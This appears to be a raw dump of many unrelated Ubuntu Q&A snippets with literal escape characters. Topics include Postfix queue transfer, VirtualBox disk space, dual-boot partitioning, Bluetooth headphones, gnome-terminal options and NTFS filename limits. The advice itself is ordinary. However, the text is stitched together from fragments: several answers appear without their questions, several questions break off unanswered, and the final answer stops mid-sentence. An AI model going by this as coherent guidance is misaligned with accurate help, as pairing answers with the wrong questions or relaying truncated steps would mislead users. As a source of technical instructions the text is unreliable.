My scenario is that I have an air gapped machine for keysigning. I was given some code that generates emails for individuals to receive their signed keys but I would like to keep this machine off any network. I set up Postfix on this machine to put all email into the hold queue. Now I'm trying to figure out a way to inject these emails onto my networked server with Postfix properly set up to deliver mail. I've tried moving the email into the hold directory and queueing them with sudo postsuper -r ALL. It says the messages were queued, but they never get delivered. Has anyone successfully accomplished this?\n\nA: If anyone else has this issue, I ended up accomplishing my goal by using postcat to dump all the queued emails into separate files, copied those to the new server and injected them into Postfix using sendmail -t. The -t flag instructs sendmail to use the headers from the file instead of specifying the sender and recipient as command line arguments.\n\nA: I was able to accomplish all this with a single command, and send the message directly to another server via ssh. I also edited the From field, setting it to the one from msg_id_in_queue (taken from enviromental variables, otherwise):\npostcat -bhq <msg_id_in_queue> | ssh user@server2 \"sendmail -t -f info@domain.com\"\n\nThis might be improved using regex to extract the From field directly from the original message, plus deleting the msg_id_in_queue thereafter, but for the use I needed, this was enough.\n\nA: You can set in the transport file /etc/postfix/transport a line like this:\n* smtp:[new_server_dns_or_ip]\n\nThen do:\npostmap /etc/postfix/transport\n\nThen do postfix reload to load changes.\nThen flush the queue with:\npostqueue -f\n\nIf instead of setting * you set a domain name, only mails to this domain will be redirected to the new server.\n\nA: I had a dead server which still had mails in /var/spool/postfix/{maildrop,defer,deferred}/.

When you deploy a charm, you're creating a service and a unit (or more than one unit by specifying the \"-n\" flag).\nFor example, if you do:\n    juju deploy mysql\nyou will have a mysql service, and a single unit of the service.

The usual culprit is an unclean shutdown. \nWhen you use a file explorer it tries to access one of the corrupted directories, the kernel discovers the corruption and remounts it read-only.\nTo verify whether this is the case open a command line immediately after the filesystem becomes read-only and type dmesg | tail. You will likely see hints about what is going on.\nI would suggest to issue command sudo touch /forcefsck and then reboot. This will force check and repair of your root filesystem and your problem will likely go away.\n\nA: You should only have read-only access to /home. User files are stored in /home/<user> (replace <user> with your username). It's part of why Unix/Linux is more secure than other operating systems. Open the Home directory, and you will see an icon for the right directory.\nBTW, when you are logged in, your encrypted home directory has a decrypted version mounted over it, so you can read/write your files.\n", "Q: Completely uninstall related packages installed with a package How do I remove exactly same stuff I have installed or system have installed with adding support for a language for example? Is there a procedure I can follow? Apt-get remove, autoremove or purge is not what I am looking for, it leaves stuff behind. \nI am currently looking into debfoster, but I hope that I am overseeing something easier and more native.\nIn this moment I have to restore my system from a snapshot to get it into previous setup, I am working on international application, when I install and uninstall for example Chinese, I will end up with several unwanted fonts that were not there before and it makes my testing pointless.\nUpdate:\nTo update and clarify my question, I already know that package installations are logged a month ago I asked How to properly remove Chinese support and I found a solution, packages installed including fonts I want to delete are only in /var/log/dpkg.log. I am looking for automation or some tool, that will automate this so I do not have to process logs every time I install and uninstall new language or an application. Apparently Ubuntu has a tiny flaw and it does not uninstall fonts on language removal, I do install a new language and then delete it several times a day for testing, I have a script I made today where I put everything from logs that does not uninstall and I still hope I am reinventing a wheel and there is already some procedure in place that keeps track of what files and other stuff package is touching and making sure it will be deleted on removal.\n\nA: If you installed \"stuff\" via a package manager (apt-get, dpkg, synaptic), it's all logged in /var/log/apt/*. It's a simple matter of editing to generate the apt-get purge commands.\nIf you installed \"stuff\" some other way (sudo make install, /usr/bin/cpan, ...) you have to uninstall it using the same method.\nTo make your life easier in the future, especially if you use the second method, consider installing and using installwatch.

In my PC, running on Ubuntu 14.04, the hard disk is divided into several partitions, and although there is vacant space in each of them there is only a paltry 8.7 MB unpartitioned space left. \nBut recently, after installing the Virtual Box when I attempted to install Windows XP in it, I was offered a 10 GB space for formatting and installing the new OS. Now can anyone tell me where exactly this 10 GB space is being taken from and, more importantly, whether this threatens my data in the various partitions? \n\nA: The virtual machine definition itself will occupy little space. The thing that will occupy space is the virtual disk where the client OS will be installed, as long as the possible snapshots you'll take1.\nNormally the disks are installed in a directory called VirtualBox VMs under your home; so it will by default occupy space in your home partition. Native Virtualbox virtual disks are dinamical; they will grow till occupying the allocated space (10G in your case) when the guest OS will use the space. \nTo check where you have yor disks, open \"settings\": \n \n...as you see, I have mine in another partition --- namely one mounted on /home/vbox. To create the virtual disk (VDI) in a non standard place, you simply select the directory where to put it on creation (you can move it later too, in a lot of way, the most easy being to move the containing directory and put a symlink in its place).\n\nThe VDI is a file as much as Linux is concerned, so you cannot put it in an unallocated space on disk2, so you have to partition, format and mount your unallocated space beforehand. \n\nFootnotes: \n1 and it will grow up, but it will not grow down --- this is much more complex. In my experience, 10G is far too little for a Windows installation --- especially if you plan to put Office on it.\n2 well, you probably can. But it's not a standard way to do it. \n\nA: \nthere is only a paltry 8.7 MB unpartitioned space left. \n\nNot important. \n\nNow can anyone tell me where exactly this 10 GB space is being taken from and, more importantly, whether this threatens my data in the various partitions? \n\nFrom the partition you installed the virtual machine. The VM makes a file on your system and treats that as a filesytem where you can install an operating system into. \n\nI was offered a 10 GB space for formatting and installing the new OS\n\nYou where also asked WHERE to create the VM. It will probably default to your home (ie. something like /home/$USER/Virtual Box/Windows XP). \n", "Q: Can't change desktop environment Ubuntu 15.10 I installed xfce and gnome desktop environments and I don't see a way how to change it.\nOn log in screen there isn't any option, does anybody have similar problem?\nThanks!\n\nA: Clicking the Unity logo in the upper side of the login credential box you should be able to switch between installed desktop environments.\n", "Q: Slow shutdown / reboot with 15.10 I have a GeForce GT 740 graphics card installed and am running a clean install of 15.10.

I enabled the Nvidia proprietary driver from the Software & Updates app to version 352.63 fro nvidia-352 (proprietary, tested).

Windows is entirely German. I want the Thunderbird GUI to be German on both Windows and the German Ubuntu user account.\nThe caveat here is that Thunderbird for Windows does not use language plug-in packages but seems to come as installation with fixed localization, but Thunderbird for Linux uses those language packs. \nNow whenever I access the profile from Windows, Thunderbird detects those language pack plug-ins, does not know what to do with them and just disables them. Going back to Ubuntu, the language pack is disabled and Thunderbird starts with the default English locale.\nHow can I automatically enable the German language pack whenever I launch Thunderbird from the German Ubuntu account?\nI guess I would have to write a script that modifies the profile configuration and then starts Thunderbird, and set that as Exec= line of the German user's personal thunderbird.desktop file.

I am afraid of messing up my windows 10...... Or what method is the best for the situation of my laptop? Can any pro teach me how to deal with this situation? Thx a lot!\n\nA: It depends on how you boot the installer. If you boot it in EFI/UEFI mode, it should go on the EFI System Partition (ESP). If you boot it in BIOS/CSM/legacy mode, it will probably go to the MBR of /dev/sda, but might conceivably go to the MBR of /dev/sdb. Either way, that's probably not what you want....\nBacking up, in a dual-boot scenario, it's important that both the OSes boot in the same mode (EFI/UEFI vs. BIOS/CSM/legacy). You've summarized your disk data rather than provided screen shots or cut-and-pasted program output, so it's impossible to tell the partition table type on /dev/sdb, and although /dev/sda is probably GPT (judging by the presence of an ESP and the Windows C: partition), I can't be 100% certain of this. The partition table type is important because Windows ties it to the boot mode -- Windows installs to MBR disks only in BIOS mode and to GPT disks only in EFI mode. Thus, you should check this detail, and if there's any doubt in your mind, post more details to clarify the situation.\nOnce you know your Windows boot mode, run the Ubuntu installer in the same mode. This can be difficult if you're unfamiliar with booting modern EFI-based computers. See my page on the CSM for advice on this mater, focused on forcing an EFI-mode boot.\nAlso, note that the \"install alongside\" option is often missing on EFI-based computers. You should be sure to disable Fast Startup and disable hibernation in Windows. (Note that many EFIs provide a feature with a name like \"fast start.\" This is unrelated to the Windows feature that you must disable.) Disabling these Windows features may cause the \"install alongside\" option to appear, but if not, you should follow instructions to use the \"something else\" option.\nFinally, the \"install alongside\" option will not know to use the partition you've created in Windows, so if you want to use something like that, you should delete that partition so that there's sufficient free space on the disk. IIRC, the Ubuntu installer will then show another option (\"install in free space\" or something like that); however, I'm not 100% positive of that. You might need to use the \"something else\" option to create partitions in that free space, and definitely to install to a partition you created in Windows.\n", "Q: Can't switch to my nvidia graphics card and i am not sure if system detects it I looked up many similar questions in this and other sites for really long time; but couldn't find any solutions.

I followed the instructions provided in the post: NETIS WF2120 Wifi Adapter Drops Signal Within Seconds\nI even went as far as changing the command provided by HackerBaloo\n\n\"This worked fine in 15.10 today, I just had to change to : sudo dkms install 8192cu/1.10\"\n\nI had no way of connecting with an ethernet cable, so I downloaded all of the packages while my other adapter was plugged in. I then unplugged all of my wireless adapters before performing any of the dkms commands.\nUpon rebooting; however, My adapter no longer functions at all. I had to un-blacklist the driver to get it to function, albeit the same unstable way,as before.\nI had followed these instructions on a previous install of Ubuntu MATE 15.04, and it all went off without a hitch. It nearly tripled my up/download speeds and maintained a connection.\nI further tried to do the same install as the post on a separate installation of 15.04, and I was unable to use the command\nsudo dkms install 8192cu/1.9\n\nI recieve this output on both machines:\nError!

Any ideas on how to get this to auto mount on startup/login?\n\nA: I just had a similar thing in KVM with a shared folder as 9p file system.\nThe solution if you can't use an /etc/fstab entry is to edit the guest OS' /etc/rc.local and insert your personal mount command (without sudo!) before the exit 0 line.\nThe file would then normally look like this:\n#!/bin/sh -e\n#\n# rc.local\n#\n# This script is executed at the end of each multiuser runlevel.\n# Make sure that the script will \"exit 0\" on success or any other\n# value on error.\n#\n# In order to enable or disable this script just change the execution\n# bits.\n#\n# By default this script does nothing.\n\nmount -t vboxsf src /home/patrick/src\n\nexit 0\n\nMake sure you edit the file as root (e.g. with sudo nano or gksudo gedit).\n\nA: @ByteCommander +1 is very clean solution but network was not available when the user want to mount the shared folder while booting guest system so add sleep 10 before mount command. \"NodeJs\" is my host shared folder and \"/var/www/html\" is mount point. \n#!/bin/sh -e\n#\n# rc.local\n#\n# This script is executed at the end of each multiuser runlevel.\n# Make sure that the script will \"exit 0\" on success or any other\n# value on error.\n#\n# In order to enable or disable this script just change the execution\n# bits.\n#\n# By default this script does nothing.\nsleep 20\nmount -t vboxsf NodeJs /var/www/html\nexit 0\n\n", "Q: how to know when that a package has been corrected bugs Last week I upgraded ubuntu studio 14.04\nMy operating system is:\nLSB Version:    core-2.0-amd64:core-2.0-noarch:core-3.0-amd64:core-3.0-noarch:core-3.1-amd64:core-3.1-noarch:core-3.2-amd64:core-3.2-noarch:core-4.0-amd64:core-4.0-noarch:core-4.1-amd64:core-4.1-noarch:security-4.0-amd64:security-4.0-noarch:security-4.1-amd64:security-4.1-noarch\nDistributor ID: Ubuntu\nDescription:    Ubuntu 14.04.3 LTS\nRelease:    14.04\nCodename:   trusty\n3.13.0-77-lowlatency\n\nOn last Friday package lbnl and I had to downgraded this package\nand execute:\nsudo apt-mark hold libnl-3-200 libnl-genl-3-200 libnl-route-3-200\n\nToday the software update give me this information:\nHow to know that this bug was corrected?\n\nA: You should search and monitor bug report on the software upstream (developer who provide the software), or just report it yourself.

This takes most of the same arguments. To scale the longest size down to 300px, we can offer -resize \"300x300>\". For safety's sake I've also got this saving the new images into a subdirectory rather than overwriting.\n# assuming you're in the directory of images\nmkdir resized\nmogrify -resize \"300x300>\" -path resized *.jpg\n\n", "Q: How to Dual-boot Ubuntu 15.10 with Windows 10 (OLD HARDWARE! NO UEFI) I have a bootable USB that has Ubuntu 15.10 on it. I used UUI (Universal USB Installer) to do this. Keep in mind that I have a computer built in 2010 that was made to support Windows 7, but I upgraded it to Windows 10. I have an old motherboard that doesn't have an option for secure boot or whatever.\nI am finally able to boot from this USB but when I get to the partition part of the installation, my partition I made (70GB) says that it is unusable. Every tutorial I watch makes this partition and when they go into the Ubuntu setup, the partition says free space, then they go about making a swap area and installing Ubuntu. In the partition tab, how come mine says unusable space?!\nI made a partition, I am using a bootable USB, but it doesn't work! I have tried everything. When I try to turn my Unallocated partition into an actual usable partition in Disk Management, it won't let me either.\n\n\nA: The problem in your case is that, in the image shown above your 289.09GB HDD is of MBR (Master Boot record)partition style which only supports up to 4 primary partitions (i.e blue partitions) . \nIf you want more than 4 partitions then you have to create an extended partition such that the total HDD has 3 primary and 1 extended partition. Then from that extended partition you can create any number of logical extended drives in which Ubuntu can be installed.\nThe one thing on your system I don't understand is that why you have 2 Recovery partitions each of same size.\nAnd also the one thing I recommend is to delete one of the primary partitions, so that you have only 3 primary partition and keep the 4th one unallocated. Now boot from the UUI (Ubuntu Live USB) and click on \"Try Ubuntu\".\nNow open Gparted Partition Editor and create an extended partition of that unallocated as a logical volume and apply the changes.\nNow click on Install Ubuntu and you'll see that it has the option of installing Ubuntu alongside Windows 10 or you may use the \"something Else\" option to create your own partitions.\nNOTE: I don't recommend you to delete the Recovery Partition as it may result in the unusual booting of Windows 10, but see in the Microsoft Community for why your PC has 2 recovery partitions.\nIf you need more help regarding this I will post pictures as I've also gone through this problem recently.\n", "Q: Thunderbird notification on KDE system tray Is there any way to have Thunderbird notification on KDE system tray.\nby Running it in Ubuntu, it doesn't bring any icon in KDE system tray.\nI use Ubuntu 14.04 with KDE \n\nA: \nYou can search for BirdTray from the Discover store:\nHowever, after you install it there is a bit of setup involved to select all the mailboxes that you want to be notified for.

I don't know how to phrase this to be clear. I'm not talking about terminals or shells, I know what the difference between login and non-login shells are. What I want to know is when I start up my computer and log in to the desktop, do any of the \"dot files\" (.profile, .bash_profile, .bashrc, etc.)  in my home folder get run? If so, which ones?\nI'm asking because by default most terminal apps you open don't use login shells by default, but I've read advice saying not to modify things like environment variables in your .bashrc file, to instead put it in .bash_profile, but how am I to set those things if I'm primarily using non-login shells? Or is that advice maybe aimed at people who SSH into their workstations?\nI obviously know how to work around any of those issues, I'm more explaining why I am curious about it than describing a problem I've run into.\n\nA: Actually this is a great question for Unix & Linux because it is not only related to Ubuntu.\nThere is a really nice answer on SuperUser which describes the Difference between .bashrc, .bash_profile and .profile. The accepted answer explains this pretty well. Here are some relevant parts from that answer:\n\nBash is a Bourne-like shell. It reads commands from ~/.bash_profile when it is invoked as the login shell, and if that file doesn't exist¹, it tries reading ~/.profile instead.\n  ...\n  If the shell is not a login shell, it doesn't read ~/.profile. When you start bash as an interactive shell (i.e., not to run a script), it reads ~/.bashrc\n\nThere is also some information about logging in using X:\n\nOn modern Unices, there's an added complication related to ~/.profile. If you login in a graphical environment (that is, if the program where you type your password is running in graphics mode), you don't automatically get a login shell that reads ~/.profile. Depending on the graphical login program, on the window manager or desktop environment you run afterwards, and on how your distribution configured these programs, your ~/.profile may or may not be read.\n\nSo if I understood your question correctly, you are asking what file is loaded if you log in in graphical mode (using lightdm, in this case your login screen is probably the Unity Greeter). And here I'm pretty sure that in this case it is .profile. The accepted answer from this question also tells us that:\n\nMost combinations of display manager (the program where you type your user name and password) and desktop environment read ~/.profile from the login scripts\n\n", "Q: Unable to connect bose soundlink AE2 headphones this is my first question here, so sorry if there is something wrong about the rules.\nI just installed Kubuntu 15.04 and i tried to connect my Bose headphones soundlink 2.\nBluedevil service reconize the headphone, but say \"no supported service found\" and my headphone tell me \"ready to connect device\".\nI tried to connect bose soundlink Mini and it work fine.\n$pactl list short | grep bluetooth\n 8       module-bluetooth-policy\n 9       module-bluetooth-discover\nThanks for helping.\nGreg\n\nA: Another way may help: \n\n\n*\n\n*install blueman sudo apt-get install blueman;\n\n*connect the headphone using blueman;\n\n*remove blue once the headphone is connected successfully, sudo apt-get purge --remove blueman. \n\n\nA: I had the same problem a few days ago.

This will be sufficient. If however you get into problems, you can always try the application blueman as well.\nThis installation procedure also applies for Ubuntu 16.04.\nMake a new file\nsudo touch /etc/bluetooth/audio.conf\n\nAdd these lines inside. Do not change anything. The order is important.\n[General]\nDisable=Socket\nDisable=Headset\nEnable=Media,Source,Sink,Gateway\nAutoConnect=true\nload-module module-switch-on-connect\n\nNow you will have to edit the file /etc/bluetooth/main.conf. Change the contents to this.\n# Restricts all controllers to the specified transport. Default value\n# is \"dual\", i.e. both BR/EDR and LE enabled (when supported by the HW).\n# Possible values: \"dual\", \"bredr\", \"le\"\nControllerMode = bredr\n\nIf you have just one Bluetooth toggle and you switch from computer all the time, change this line too. Change the code to this.\n# AutoEnable defines option to enable all controllers when they are found. \n# This includes adapters present on start as well as adapters that are plugged \n# in later on. Defaults to 'false'. \nAutoEnable=true\n\nLet the magic of rebooting be on your side. So reboot.\nEnable pairing on your headphones.\nGo to the Bluetooth icon, enable bluetooth and connect to your device.\nGo to the sound icon (bottom right) and select your device.\nSee that the Output profile is High Fidelity Playback (A2DP sink). MUCH better sound than the other setting Headset Head Unit (HSP/HFP). As long as you do not see this headphone in your sound settings, you guessed it, something is wrong. And in Bluetooth nothing seems that simple. Then you can start Googling. I suggest the Arch Linux guide as a start.\nWhen all is working, do close this window as it will be glitching the music since it is scanning for other bluetooth devices.\nWhen you have been trying to add the Bluetooth device for a while, REMOVE IT and try again. That seemed to work for me.\n\n\nA: Also can try to replace PulseAudio with the more modern PipeWire:\napt install libspa-0.2-bluetooth && apt purge pulseaudio-module-bluetooth\n\nThen reboot.\nSee https://unix.stackexchange.com/a/676829/408419\n", "Q: Can't change gedit preferences and terminal preferences don't save I'm new to Ubuntu and Linux in general.

If I execute motoe.sh from a terminal, it runs correctly.\n\nA: -1- Be careful when you run an external program as udev execution will be suspended during the external program's execution. Better said, it will wait until the external program exits before proceeding. You can still execute a long winded program but you must \"detach\" it immediately, by running it in the background. In yr case, yr motoe.sh should probably read:\n#!/bin/bash\n{ \n   motoemount.sh\n   motoedesktop.sh\n} &\n\nwhich is equivalent to { motoemount.sh; motoedesktop.sh }&, i.e. executing motoedesktop.sh unconditionnally after motoemount.sh has exited. \nNote that :\n$ motoemount.sh &; motoedesktop.sh\n\nmeans that motoemount.sh and motoedesktop.sh are executed asynchronously, i.e. motoedesktop.sh starts executing before motoemount.sh even exits. \n$ motoemount.sh && motoedesktop.sh\n\nis not the same. In that case, motoedesktop.sh executes ONLY if the exit value of motoemount.sh is \"0\". \n\n[....] If I execute motoe.sh from a terminal, it runs correctly\n\n-2- udev does not run external programs on any active terminal, and it does not execute them under the context of a shell. Be sure to ensure your program is marked executable, if it is a shell script ensure it starts with an appropriate shebang (e.g. #!/bin/sh). The environment that udev sees will not be the same environment you (or whoever $USER) is gets on the console. So specify absolute paths for all your commands:\nmotoemount.sh  -> /path/to/motoemount.sh\nmotoedesktop.sh  -> /path/to/motoedesktop.sh\ngo-mtpfs -> ...\ngmessage -> ...\nrdesktop -> ...\numount  -> /bin/umount\nIn order to find a path for system cmds (such as umount) you can use the cmd which [cmd] without brackets, e.g.:\n$ which umount\n/bin/umount\n\n-3- Verify that yr process has sufficient privileges to unmount /media/MyAndroid/\n\n[....] If I execute motoe.sh from a terminal, it runs correctly\n\n-4- If you print to screen (not sure you do, as I'm not familiar with gmessage but it looks like you do), make sure your DISPLAY environment variable is set (known to udev) and exported (passed on to sub-shells). Otherwise do not expect any standard output to appear on your terminal. For an example see this, in particular the # set DISPLAY section.  \n", "Q: Ubuntu network performance on over 2k connections I'm using an EC2 c3.8xlarge Ubuntu 14.04 LTS machine with over 3k threads simultaneously downloading web pages one after another.  \nAlthough this machine should have a 10Gb network performance, I can't get it to perform higher than 10MB/s. \nIS there any way I can improve the network speed of my machine?\nmy /etc/sysctl.conf\nnet.core.rmem_max = 16777216\nnet.core.wmem_max = 16777216\nnet.ipv4.tcp_syncookies = 0\nnet.ipv4.ip_forward = 0\nnet.ipv6.conf.all.forwarding = 0\nfs.file-max = 262144\nnet.ipv4.tcp_keepalive_time = 60\nnet.ipv4.tcp_fin_timeout = 30\nnet.ipv4.tcp_tw_reuse = 1\nnet.ipv4.conf.all.log_martians = 0\nnet.ipv4.ip_local_port_range = 1024 65000\nnet.core.somaxconn = 1024\nnet.ipv4.tcp_rmem = 4096 87380 16777216\nnet.ipv4.tcp_wmem = 4096 65536 16777216\nnet.ipv4.tcp_mem = 16777216 16777216 16777216\nnet.ipv4.tcp_max_orphans = 262144\nnet.core.netdev_max_backlog = 2000\nnet.ipv4.route.flush=1 \n\n\nA: \n3k threads simultaneously\n\nThere is your problem.  You need to redesign your application to not use an insane number of threads, which are all competing with one another for resources.  See io_submit() and friends for how to send the kernel an IO request without blocking the thread until it completes.  You can also use setsockopt() to set the kernel buffer size to zero so that it won't waste time copying data back and forth between your buffers and its own.  Of course, you will need to make sure to give it multiple pending IO requests at the same time so that as soon as it finishes one it already has another to move on to completing.  By doing this, you can have a single thread ( or one per cpu core anyhow ) manage all of the IO on thousands of connections without the overhead of switching between thousands of threads.\n", "Q: Ununtu 15.10 desktop on a HP Laptop Video Driver Issues Nvida I have a HP G60-445DX laptop that I installed Ubuntu Desktop 15.10 on.

Is it possible to have a Zenity list-style menu show a code option like -r?\nI am trying to make a simple GUI for an FFMPEG bash script. This is just one prompt for selecting a framerate for a video. I wanted one of the Zenity list columns to show the actual FFMPEG option that would be used, it would be for returning to be used in the FFMPEG code, but also to hopefully teach some FFMPEG syntax to the user. Like this:\n#!/bin/sh\n\nzenity --list \\\n    --title=\"Select framerate\" \\\n    --column=\"ffmpeg code\" --column=\"Framerate\" --column=\"Description\" \\\n    \"-r 24000/1001\" \"23.976fps\" \"NTSC compatible 24fps\" \\\n    \"-r 30000/1001\" \"29.98fps\" \"NTSC compatible 30fps\"\n\nBut this gives the Zenity error message:\nThis option is not available. Please see --help for all possible usages.\n\nI think I understand what the problem is; Zenity thinks the -r is a Zenity option, and doesn't recognize it.\nJust removing the - before the -r fixes it:\nzenity --list \\\n    --title=\"Select framerate\" \\\n    --column=\"ffmpeg code\" --column=\"Framerate\" --column=\"Description\" \\\n    \"r 24000/1001\" \"23.976fps\" \"NTSC compatible 24fps\" \\\n    \"r 30000/1001\" \"29.98fps\" \"NTSC compatible 30fps\"\n\nShows no error and correctly displays:\n\nBut then of course this would not teach anyone how to use the FFMPEG framerate option because the dash is needed.\nEscaping the dash with a backslash like \\- just prints the backslash too, which would also not teach anyone FFMPEG:\n\nI've also tried using ' and \"\"\" and ''' instead of the double quotes, but they give the same This option is not available... error message.\nIs it just not possible to get Zenity to display something like that?

The output I desire is:\nabcd.vc.9902 m\nabc g\ncdb.5491-3 k\n\n\nA: Just replace * with a + (and escape it if you are using just sed, not sed -r, as + is an extended Regex pattern):\nsed 's/ [0-9]\\+//g' data\n\nOr\nsed -r 's/ [0-9]+//g' data\n\nIn Regex * indicates zero or more match of the preceding token, so in your case if there is no match i.e. no digits after space its being matched too.\nOn the other hand, if you use +, you are matching (at least) one or more digits after a space so you will get the desired result.\n", "Q: gnome-terminal --disable-factory support problem $ gnome-terminal  --tab  --title=\"700\"  --disable-factory  -e\n\nFailed to parse arguments: Option \"--disable-factory\" is no longer supported in this version of gnome-terminal.\n\nI am using GNOME 3.\n\nA: If you really need multiple instances of gnome-terminal process running (but why should you?), follow the steps at https://wiki.gnome.org/Apps/Terminal/Debugging except for the gdb part.\n\nA: For the benefit of the reader.\nThe problem\nOption --disable-factory got removed in V3.8 of gnome-terminal and there is no way to archive this behavior the easy way.  At least not a way, which can be explained to people, who are not fluent in shell syntax.\nHence the command line\ngnome-terminal  --tab  --title=\"700\" --disable-factory -e ...\n\nfails with the error presented in the question.\n\nPlease excuse this very personal side note:  I really do not understand, why this crucial option got removed.  Even Microsoft introduced an option to run cmd, explorer or powershell the blocking way.  Microsoft listens to their users.  But Gnome does not.  Instead of officially documenting the hidden option --disable-factory, Gnome suddenly removed it.  If they continue this course, they will make Microsoft win on the long term.  That is very very sad and extraordinary stupid.  (Sorry for this rant, but it has to be be said.)\n\nBTW: Ubuntu 16.04 restored --disable-factory using a wrapper which emulates this feature.  (If you look at the complexity of this wrapper, my rant still applies even more than before.)\nVariant 0\nI call this 0, because both are not really proper solutions.  A proper solution is shown in Variant 1.\nVarriant 0a\nA first thing, you can try, is to remove option --disable-server:\ngnome-terminal --tab --title=\"700\" -e ...\n\nHowever this has following drawback:\nThis does no more wait until gnome-terminal finishes.  If there is another gnome-terminal running, the command immediately comes back.  Usually this is not what you want, because this is, why option --disable-factory was present in the first place.\nVariant 0b\nSo removing this option is only feasible in the case, where you can make sure, that in all and every case, no other gnome-terminal is running, ever.\nIf this is not the case, but you are in a case, where another running gnome-terminal must not be supported, you can try following desparate fallback variant:\nkillall -9 gnome-terminal\ngnome-terminal  --tab  --title=\"700\" -e ...\n\nBut beware!  This unconditionally kills all gnome-terminals which are still open.  In a production environment this usually will cause greater harm then it helps.  You have been warned!\nVariant 1\nIf you do not need to run it in gnome-terminal and can run it in some other terminal emulator.  @muru commented a good replacement.\nxfce4-terminal understands nearly the same set of options as gnome-terminal (and adds some very handy other options which are missing in gnome-terminal for years).  It also has a documented option, which does, what --disable-factory did for gnome-terminal.  The option --tab works differently to gnome-terminal and thus must be removed, too, to get something working.  The replacement is:\nxfce4-terminal --title=\"700\" --disable-server -e ...\n\nAlso you can add a --hold option, if you want to be able to see the full output of the command before the window is closed:\nxfce4-terminal --hold --title=\"700\" --disable-server -e ...\n\nPlease note that xfce4-terminal has a little race-condition, which unfortunately truncates the output, so --hold is not fully effective.  Fixing this properly (such that you can use it copy'n'paste) is beyond the scope of the answer, however usually adding a little echo $? && read -t.1 to the script which is executed with (behind) -e can solve it 99% of the time.\nIn case you get the message, that xfce4-terminal is missing, then you have to install it first.  It can be installed in parallel to gnome, even that it belongs to another desktop variant (Xfce):\nsudo apt-get install xfce4-terminal\n\nThe only drawback is, that xfce4-terminal has another look than gnome-terminal, and follows some other \nVariant 2..∞\nThere are endless other possible variants to fix that issue.  Most of them are really complicated.  Too complicated for normal people, those, who are not really into shells.\nSo I leave them away.  My recommendation is:\nAs noted by @muru, try to use xfce4-terminal instead of gnome-terminal.\nNote to those, who grok shells\nAll simple solutions are not really perfect, as they do not return the command's return value (gnome-terminal does not, too).  Sadly.

At first I tried right clicking on it in nautilus and selecting format.  I selected NTFS and tried to format it.  I got some error shortly after saying something had timed out.  Next I tried formatting it with gparted which is annoying since every time after I use it I get some sort of D-Bus error when I try to access my hard drives.  I used gparted to give it the NTFS file system and restarted my computer.  When I tried to open the drive in nautilus I got an error about the drive having a pending operation.  \nNext I decided to try the ext4 format.  I got the same error when I tried to format it through nautilus, but it seemed to work when I did it through gparted.  I was able to mount the drive and copy some files.  This is a backup drive so I went to copy a folder of 600 GB size with some 12000 different files.  At first the copy was really fast going at almost 100 Mb per second but at around 2 GB it became painfully slow as in maybe 3 Mb per second.  It did not look like much disk activity was happening with my computer and it was just stalling for some reason.  I then cancelled the copy and removed the drive.  When I plugged it back in I got the pending operation error again.\nNext I tried to boot into windows to format it and of course that went horribly as well.  The windows format tool either didn't recognize the drive or when it was plugged in actually crashed windows.  When I did get the format tool to finally see the drive I tried formatting it and it just said formatting for over an hour.  \nI would think that this issue may be with my usb drive but I have had similar unresolved nightmares trying to format flash drives on ubuntu 15.10.  Also I tried to format it on ubuntu on my other computer and had the same issues.  Any advice?\n\nA: I would use gnome-disk-utility\nformating the drive, not the partition.\nNext, (if it is the case) in Windows format in NTFS using Disk Managment.\nFor the (so many) folder/files copying, grsync is a better choice than simple copy-paste.

The version inside XAMPP may be php 5.6, but the version installed to your system is different.\nSince you're on 12.04, I don't think you can install php 5.6 from the standard repos using apt-get.\nYou have two options:\n1) Install php 5.6 manually. This is the best way, but it may be difficult for a first timer. You will also need to install apache 2.4, as PHP 5.6 is not compatible with the version in 12.04 (I think):\nhttp://php.net/manual/en/install.unix.apache2.php\n2) Install PHP 5.6 from a 3rd party repository.

Any other suggestions please? Does anybody have a working config for this device?\n\nA: Changing the MaxTapTime from 180 to 80 really changed the behavior of the touchpad for me. Two finger scrolling is not triggering right click anymore and the single tap is working pretty well.\nAccording to the synaptics configuration page http://www.x.org/archive/X11R7.5/doc/man/man4/synaptics.4.html the MaxTapTime property matches the maximum time your finger is touching the touchpad to detect the tap. Reducing it allows the system not to detect a two finger click when you're doing a two finger scroll\nThere is also a MaxTapMove property which I think have a role in this behavior but I could not find how to change this value for now as the first one has resolve a big part of the problem.\n", "Q: 15.10: 'startx $(which unity)' fails when booting to console I followed this answer and ran the following commands on my 15.10 with Unity Desktop to boot to text mode:\nsudo systemctl enable multi-user.target --force\nsudo systemctl set-default multi-user.target\n\nThe first command gave me the following output though, but I proceeded anyway:\nThe unit files have no [Install] section.

Is it a problem related to special characters?\nI have a lot of files in the folder, so I don't want to rename them all. I am using the GUI.\n\nA: This isn't an Ubuntu problem but a Microsoft problem. As you said, your external hard drive is formatted with NTFS which means that you're not as free to choose your file names as you are when using ext.\nYou can't use any of these characters in file names when using NTFS:\nU+0000 (NUL) / (slash) : (colon) * (asterisk) ? (Question mark) \" (quote) < (less than) > (greater than) and | (pipe).\nIf you want to view your files on Windows (which is the only reason to use NTFS), Microsoft restricts you even further: You cannot use the backslash (\\) and certain words. \nFurthermore, you might run into trouble if you use long path names. With ext, pathnames can be as long as you wish, but Microsoft limits path length. \nYou can solve this problem (actually you avoid it) by formatting the partition on you external hard drive with ext4. GParted can do this. \nsudo apt-get install gparted\n\nPlease note that formatting a partition will make the data previously stored on this partition inaccessible. \nIf you merely want to transport the files between 2 machines which are capable of properly handling filenames, tar these files and give the tar ball a name acceptable for NTFS. \n", "Q: Apache Web Server Configuration to install Owncloud 8.2.2 on Ubuntu 14.04 I'm trying to install ownCloud server and I did the first steps ok, using the instructions of the manual. Now it's time to configure Apache web server. \nPlease look to the extract of the installation manual below. \nMy point is how to create the owncloud.conf file. I tried to do it using the graphical interface of Ubuntu, but I guess that I should to it using the terminal. What commands should I use in the terminal? \nApache Web Server Configuration¶\nOn Debian, Ubuntu, and their derivatives, Apache installs with a useful configuration so all you have to do is create a /etc/apache2/sites-available/owncloud.conf file with these lines in it, replacing the Directory and other filepaths with your own filepaths:\n\n  Options +FollowSymlinks\n  AllowOverride All\n\n  Dav off\n \nSetEnv HOME /var/www/html/owncloud\n SetEnv HTTP_HOME /var/www/html/owncloud\n\nIf you install ownCloud outside of Apache’s DocumentRoot, then you must add an Alias directive at the top of the file. In this example ownCloud is installed in /var/www/owncloud:\nAlias /owncloud \"/var/www/owncloud/\"\nThen create a symlink to /etc/apache2/sites-enabled:\n\nA: Old question but answering.\nYou can use nano or pico from the terminal to make a new file. \nFor example,\nsudo nano owncloud.conf\nwill open a new blank file with name 